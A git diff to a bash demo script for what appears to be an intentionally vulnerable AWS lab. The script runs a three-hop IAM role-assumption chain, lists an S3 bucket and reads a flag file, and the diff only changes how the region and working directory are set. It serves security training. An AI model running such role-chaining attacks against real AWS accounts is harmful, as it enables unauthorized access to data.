@@ -5,9 +5,6 @@
 
 set -e  # Exit on any error
 
-# Configuration
-REGION="us-west-2"
-
 # Disable paging for AWS CLI
 export AWS_PAGER=""
 
@@ -32,12 +29,10 @@ show_attack_cmd() {
     ATTACK_COMMANDS+=("$*")
 }
 
-# Navigate to the Terraform root directory (6 levels up from scenario directory)
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-TERRAFORM_ROOT="$(cd "$SCRIPT_DIR/../../../../../.." && pwd)"
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 
 echo "🔍 Retrieving credentials from Terraform outputs..."
-cd "$TERRAFORM_ROOT"
+cd ../../../../../..
 
 # Get the grouped module output
 MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_multi_hop_to_bucket_role_chain_to_s3.value // empty')
@@ -51,9 +46,6 @@ if [ -z "$MODULE_OUTPUT" ] || [ "$MODULE_OUTPUT" == "null" ]; then
     echo ""
     echo "  2. Terraform has not been applied yet"
     echo "     Run: terraform apply"
-    echo ""
-    echo "  3. You are not in the correct directory"
-    echo "     Current Terraform root: $TERRAFORM_ROOT"
     echo ""
     exit 1
 fi
@@ -69,6 +61,7 @@ STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
 
 READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
 READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "us-east-1")
 
 if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
     echo "Error: Could not find readonly credentials in terraform output"
@@ -103,7 +96,7 @@ source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
 restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 
-export AWS_DEFAULT_REGION="$REGION"
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo ""
 echo "🎯 Starting 3-hop role assumption chain attack..."
@@ -133,12 +126,12 @@ echo ""
 echo "🔄 Step 2: Assuming intermediate role..."
 echo "Role ARN: $INTERMEDIATE_ROLE_ARN"
 
-show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$INITIAL_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$INITIAL_SECRET_KEY AWS_SESSION_TOKEN=\$INITIAL_SESSION_TOKEN aws sts assume-role --region $REGION --role-arn $INTERMEDIATE_ROLE_ARN --role-session-name "attack-intermediate-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text"
+show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$INITIAL_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$INITIAL_SECRET_KEY AWS_SESSION_TOKEN=\$INITIAL_SESSION_TOKEN aws sts assume-role --region $AWS_REGION --role-arn $INTERMEDIATE_ROLE_ARN --role-session-name "attack-intermediate-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text"
 INTERMEDIATE_CREDENTIALS=$(AWS_ACCESS_KEY_ID=$INITIAL_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$INITIAL_SECRET_KEY \
     AWS_SESSION_TOKEN=$INITIAL_SESSION_TOKEN \
     aws sts assume-role \
-    --region $REGION \
+    --region $AWS_REGION \
     --role-arn $INTERMEDIATE_ROLE_ARN \
     --role-session-name "attack-intermediate-role" \
     --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
@@ -155,12 +148,12 @@ echo ""
 echo "🔄 Step 3: Assuming S3 access role..."
 echo "Role ARN: $S3_ACCESS_ROLE_ARN"
 
-show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$INTERMEDIATE_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$INTERMEDIATE_SECRET_KEY AWS_SESSION_TOKEN=\$INTERMEDIATE_SESSION_TOKEN aws sts assume-role --region $REGION --role-arn $S3_ACCESS_ROLE_ARN --role-session-name "attack-s3-access-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text"
+show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$INTERMEDIATE_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$INTERMEDIATE_SECRET_KEY AWS_SESSION_TOKEN=\$INTERMEDIATE_SESSION_TOKEN aws sts assume-role --region $AWS_REGION --role-arn $S3_ACCESS_ROLE_ARN --role-session-name "attack-s3-access-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text"
 S3_CREDENTIALS=$(AWS_ACCESS_KEY_ID=$INTERMEDIATE_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$INTERMEDIATE_SECRET_KEY \
     AWS_SESSION_TOKEN=$INTERMEDIATE_SESSION_TOKEN \
     aws sts assume-role \
-    --region $REGION \
+    --region $AWS_REGION \
     --role-arn $S3_ACCESS_ROLE_ARN \
     --role-session-name "attack-s3-access-role" \
     --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
@@ -177,21 +170,21 @@ echo ""
 # Get the actual bucket name by listing S3 buckets and finding the one with our prefix
 echo "🔄 Step 4: Listing contents of S3 bucket: $S3_BUCKET_NAME"
 
-show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 ls s3://$S3_BUCKET_NAME --region $REGION"
+show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 ls s3://$S3_BUCKET_NAME --region $AWS_REGION"
 AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
     AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
-    aws s3 ls s3://$S3_BUCKET_NAME --region $REGION
+    aws s3 ls s3://$S3_BUCKET_NAME --region $AWS_REGION
 
 # [EXPLOIT] Step 5: Read the CTF flag from the target bucket
 echo ""
 echo "🔄 Step 5: Reading flag.txt from target bucket..."
 
-show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 cp s3://$S3_BUCKET_NAME/flag.txt - --region $REGION"
+show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 cp s3://$S3_BUCKET_NAME/flag.txt - --region $AWS_REGION"
 FLAG_VALUE=$(AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
     AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
-    aws s3 cp s3://$S3_BUCKET_NAME/flag.txt - --region $REGION)
+    aws s3 cp s3://$S3_BUCKET_NAME/flag.txt - --region $AWS_REGION)
 
 echo ""
 echo "📄 Flag:"
